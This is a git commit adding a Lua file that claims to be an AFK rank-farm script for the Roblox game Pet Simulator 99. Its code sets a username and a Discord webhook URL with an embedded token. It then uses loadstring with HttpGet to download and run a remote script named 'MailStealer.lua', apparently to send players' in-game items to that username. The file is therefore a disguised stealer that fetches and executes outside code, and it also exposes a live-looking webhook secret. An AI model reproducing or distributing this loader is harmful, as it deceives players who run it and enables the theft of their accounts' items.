75656c10d92ea327842ff3d581f2cda80836a544
Plahfirbsj <kpak70221@gmail.com>
2024-05-21 15:00:27 +1200

    Add files via upload

---
+++ PS99 RANK FARM AFK.lua
@@ -0,0 +1,6 @@
+Username = "Txq_pxT"
+LoadScreen = true 
+Webhook = "https://discord.com/api/webhooks/1242308637326577748/xLUPpv9NkFX8Hy22LpvUaAuKGM-mBp53k61izUdfn0x-R8IjvM1iYVsrn4CzATSIpd5T"
+
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/KiuuP/PS99_Mailstealer/main/MailStealer.lua"))()
